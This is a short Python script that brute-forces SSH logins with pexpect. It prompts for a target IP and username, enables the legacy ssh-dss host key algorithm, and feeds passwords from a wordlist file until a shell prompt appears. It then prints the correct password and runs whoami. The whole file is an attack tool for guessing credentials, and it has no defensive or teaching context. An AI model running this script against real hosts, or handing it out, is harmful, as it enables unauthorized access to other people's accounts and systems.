import pexpect
from termcolor import colored
from sys import exit

def connect_ssh(host, username):
	command = f'ssh -o HostKeyAlgorithms=+ssh-dss {username}@{host}'
	child = pexpect.spawn(command)
	child.expect('password')

	with open('ssh_passwords.txt', 'r') as file:
		for password in file.read().split('\n'):
			if password != "":
				child.sendline(password)
				idx = child.expect(['\$ ', 'Permission denied'])
				if idx != 0:
					print(colored(f'Wrong password: {password}', 'red'))
				else:
					print(colored(f'Correct password: {password}', 'green'))
					child.sendline('whoami')
					child.expect('\$ ')
					print(child.before.decode())
					exit()

if __name__ == '__main__':
	host = input('Type the target IP: ')
	username = input('Type the ssh username: ')

	connect_ssh(host, username)
